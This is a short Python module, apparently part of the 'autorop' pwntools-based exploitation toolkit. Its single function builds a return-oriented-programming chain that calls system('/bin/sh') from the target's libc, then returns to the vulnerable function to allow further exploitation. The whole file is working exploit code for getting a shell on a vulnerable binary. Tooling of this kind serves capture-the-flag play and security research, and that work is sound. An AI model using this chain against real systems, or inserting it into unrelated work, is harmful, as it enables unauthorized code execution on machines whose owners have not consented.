from autorop import PwnState, arutil
from pwn import log, ROP


def system_binsh(state: PwnState) -> PwnState:
    """Call ``system("/bin/sh")`` via a rop chain.

    Call ``system("/bin/sh")`` using a rop chain built from ``state.libc`` and
    written by ``state.overwriter``.

    Arguments:
        state: The current ``PwnState`` with the following set:

            target: What we want to exploit.
            elf: pwntools ``ELF`` of ``state.binary_name``.
            libc: ``ELF`` of ``target``'s libc, with ``state.libc.address``
                  already set appropriately.
            vuln_function: Name of vulnerable function in binary,
                           which we can return to repeatedly.
            overwriter: Function which writes rop chain to the "right place".

    Returns:
        Reference to the mutated ``PwnState``, with no direct property updates.
    """
    assert state.libc is not None
    assert state.overwriter is not None

    rop = ROP([state.elf, state.libc])
    rop.system(next(state.libc.search(b"/bin/sh\x00")))
    rop.call(state.vuln_function)  # just in case, to allow for further exploitation
    log.info(rop.dump())

    state.overwriter(state.target, rop.chain())

    return state
